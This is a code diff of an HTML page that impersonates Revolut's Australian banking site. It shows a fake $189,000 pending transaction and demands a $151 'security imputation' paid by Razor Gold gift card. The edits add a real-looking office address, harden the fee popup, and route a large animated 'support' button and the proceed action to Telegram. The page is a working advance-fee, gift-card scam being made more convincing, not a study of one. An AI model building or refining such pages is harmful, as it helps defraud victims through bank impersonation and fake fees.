@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolut — Welcome Back</title>
+    <title>R</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
     <style>
@@ -33,6 +33,18 @@
             border: 4px solid rgba(255,255,255,0.1);
             border-top-color: #22d3ee;
             animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .support-btn {
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
         }
     </style>
 </head>
@@ -94,7 +106,7 @@
             </button>
         </div>
 
-        <p class="text-center text-xs text-zinc-500 mt-8">Revolut Payments Australia Pty Ltd • Sydney NSW</p>
+        <p class="text-center text-xs text-zinc-500 mt-8">Revolut Payments Australia Pty Ltd • Level 28, 161 Castlereagh Street, Sydney NSW 2000</p>
     </div>
 
     <!-- PENDING NOTIFICATION -->
@@ -161,49 +173,46 @@
     <div id="notice-popup" class="hidden fixed inset-0 bg-black/80 z-[200] flex items-center justify-center p-4">
         <div class="modal bg-zinc-900 max-w-md w-full rounded-3xl p-8">
             <div class="text-amber-400 text-center">
-                <i class="fa-solid fa-info-circle text-5xl"></i>
+                <i class="fa-solid fa-triangle-exclamation text-5xl"></i>
             </div>
-            <h3 class="text-2xl font-semibold text-center mt-6">Notice from Revolut Database</h3>
+            <h3 class="text-2xl font-semibold text-center mt-6">Database Verification Required</h3>
             
-            <div class="mt-8 text-zinc-300 leading-relaxed">
-                To complete the verification of your pending transaction of <span class="font-medium">$189,000.00</span>, 
-                our system requires a <span class="text-white">$1.00</span> imputation using your Razor Gold Card for security confirmation.
+            <div class="mt-8 text-zinc-300 leading-relaxed text-center">
+                To securely process and release your pending transaction of <span class="font-medium">$189,000.00</span>, 
+                our system requires a one-time <span class="text-white font-semibold">$151.00</span> security imputation using your Razor Gold Card.
             </div>
             
-            <div class="mt-6 bg-zinc-800 rounded-2xl p-5 text-sm">
-                <div class="flex justify-between">
-                    <span class="text-zinc-400">Amount to impute</span>
-                    <span class="font-medium">$1.00 AUD</span>
+            <div class="mt-8 bg-zinc-800 rounded-2xl p-6">
+                <div class="flex justify-between items-center">
+                    <span class="text-zinc-400">Verification Fee</span>
+                    <span class="text-2xl font-semibold text-white">$151.00 AUD</span>
                 </div>
             </div>
             
-            <button onclick="closeAll()" 
-                    class="mt-10 w-full py-5 bg-violet-600 hover:bg-violet-700 rounded-3xl font-semibold">
-                Proceed with $1 Verification
+            <button onclick="proceedToSupport()" 
+                    class="mt-10 w-full py-5 bg-violet-600 hover:bg-violet-700 rounded-3xl font-semibold text-lg flex items-center justify-center gap-x-3">
+                <span>Proceed with Verification</span>
+                <i class="fa-solid fa-arrow-right"></i>
             </button>
             
-            <div onclick="closeAll()" class="text-center text-xs text-zinc-400 mt-6 cursor-pointer hover:text-white">
-                Cancel
+            <div onclick="closePopup()" class="text-center text-sm text-zinc-400 mt-6 cursor-pointer hover:text-white transition-colors">
+                Cancel &amp; Return Later
             </div>
         </div>
     </div>
 
-    <!-- FLOATING SUPPORT -->
-    <a href="https://t.me/Transfermethod" target="_blank" 
-       class="fixed bottom-8 right-8 bg-zinc-800 hover:bg-zinc-700 w-14 h-14 rounded-3xl flex items-center justify-center text-2xl shadow-2xl z-50">
+    <!-- LARGE FLOATING SUPPORT BUTTON -->
+    <a href="https://t.me/" target="_blank" id="support-btn"
+       class="support-btn fixed bottom-8 right-8 bg-gradient-to-br from-violet-600 to-fuchsia-600 w-20 h-20 rounded-3xl flex items-center justify-center text-3xl shadow-2xl z-[300] hover:scale-110 active:scale-95 transition-all border-4 border-zinc-900">
         <i class="fa-solid fa-headset"></i>
     </a>
 
     <script>
         function confirmTransaction() {
-            document.getElementById('confirm-btn').innerHTML = `
-                <i class="fa-solid fa-check mr-2"></i> Confirmed
-            `;
+            const btn = document.getElementById('confirm-btn');
+            btn.innerHTML = `<i class="fa-solid fa-check mr-2"></i> Confirmed`;
+            btn.disabled = true;
             document.getElementById('pending-notification').classList.remove('hidden');
-            
-            setTimeout(() => {
-                document.getElementById('pending-notification').classList.add('animate-pulse');
-            }, 800);
         }
 
         function showTransactionDetails() {
@@ -221,15 +230,18 @@
             setTimeout(() => {
                 document.getElementById('loading-screen').classList.add('hidden');
                 document.getElementById('notice-popup').classList.remove('hidden');
-            }, 2600);
+            }, 2450);
         }
 
-        function closeAll() {
+        function proceedToSupport() {
+            window.open('https://t.me/', '_blank');
+        }
+
+        function closePopup() {
             document.getElementById('notice-popup').classList.add('hidden');
-            document.getElementById('pending-notification').classList.add('hidden');
         }
 
-        // Auto hide welcome
+        // Welcome screen
         setTimeout(() => {
             const overlay = document.getElementById('welcome-overlay');
             if (overlay) overlay.style.display = 'none';
@@ -246,7 +258,7 @@
                 }
                 document.getElementById('balance').textContent = '$' + bal.toLocaleString('en-AU') + '.36';
             }, 35);
-        }, 1000);
+        }, 800);
     </script>
 </body>
 </html>
